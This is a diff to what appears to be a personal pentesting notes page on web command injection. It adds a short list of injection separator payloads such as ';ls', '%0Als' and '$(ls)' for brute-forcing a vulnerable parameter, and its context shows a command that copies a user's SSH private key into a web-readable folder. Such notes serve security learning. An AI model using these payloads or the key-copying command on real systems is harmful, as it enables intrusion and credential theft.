@@ -33,7 +33,27 @@ Now we can try to make the file with our output and finally see it:<br />
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/4e332df8-c71e-44e9-ab4d-9c3d06658fcc" width="600"><br />
 Once we have obtained the username we can attempt, for example, to retrieve the `id_rsa`. with the command `cat /home/<username>/.ssh/id_rsa > /var/www/images/id_rsa.txt`. If the command was successful we can now access the target system via ssh.
 
+## Brute Forcing Injections.
+We can brute Force to get the working parameter faster.
+(HackTricks command Injection Cheatsheet.)[https://book.hacktricks.xyz/pentesting-web/pocs-and-polygloths-cheatsheet]
+```bash
+;ls
+||ls;
+|ls;
+&&ls;
+&ls;
+%0Als
+`ls`
+$(ls)
+```
 
+<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/a6286450-746e-4fb0-9291-8739fc0fea07" width="600">
+
+
+<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/2f89576c-26c1-4cb6-9769-fb3f1def4685" width="700">
+
+
+<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/3afa8493-d906-435c-ad39-700175eb44f2" width="700">
 
 
 
